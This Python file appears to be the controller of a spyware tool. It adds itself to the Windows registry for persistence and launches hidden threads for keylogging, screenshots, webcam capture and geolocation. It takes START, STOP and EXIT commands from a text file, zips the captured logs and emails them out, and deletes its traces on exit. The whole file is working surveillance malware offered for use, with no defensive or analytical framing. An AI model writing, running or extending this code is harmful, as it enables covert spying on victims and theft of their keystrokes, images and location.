import threading
import time
import os
import shutil

from core import persistence, geolocation, logger, screenshot, webcam
from send.mailer import send_email

active_state = {"value": False}
threads_started = False

def cleanup():
    """Remove logs, zip, and cache files."""
    for item in [".logs", "logs_encrypted.zip"]:
        if os.path.exists(item):
            if os.path.isdir(item):
                shutil.rmtree(item)
            else:
                os.remove(item)

    for root, dirs, _ in os.walk("."):
        for d in dirs:
            if d == "__pycache__":
                shutil.rmtree(os.path.join(root, d))
                print(f"[+] Removed: {os.path.join(root, d)}")
    print("[+] Cleanup complete.")

def command_loop():
    global threads_started
    while True:
        try:
            with open("command.txt") as f:
                cmd = f.read().strip().upper()

            if cmd == "START" and not active_state["value"]:
                print("[*] START command received. Executing payloads.")
                active_state["value"] = True
                if not threads_started:
                    start_threads()
                    threads_started = True

            elif cmd == "STOP" and active_state["value"]:
                print("[*] STOP command received. Halting payloads and sending email.")
                active_state["value"] = False
                time.sleep(2)
                zip_and_send_logs()

            elif cmd == "EXIT":
                print("[!] EXIT command received. Cleaning up and exiting...")
                cleanup()
                break

            time.sleep(2)

        except FileNotFoundError:
            time.sleep(2)

def start_threads():
    """Start persistence and all capture threads."""
    persistence.add_to_registry()
    geolocation.get_geolocation()

    threading.Thread(target=logger.start_logger, args=(active_state,), daemon=True).start()
    threading.Thread(target=screenshot.screenshot_loop, args=(active_state,), daemon=True).start()
    threading.Thread(target=webcam.webcam_loop, args=(active_state,), daemon=True).start()

def zip_and_send_logs():
    """Zip the logs and send via email."""
    if os.path.exists(".logs"):
        archive_name = "logs_encrypted"
        shutil.make_archive(archive_name, "zip", ".logs")
        print("[+] Logs zipped. Sending via email...")
        send_email()
    else:
        print("[-] No logs found to zip.")

if __name__ == "__main__":
    print("[*] Waiting for command in command.txt...")
    command_loop()
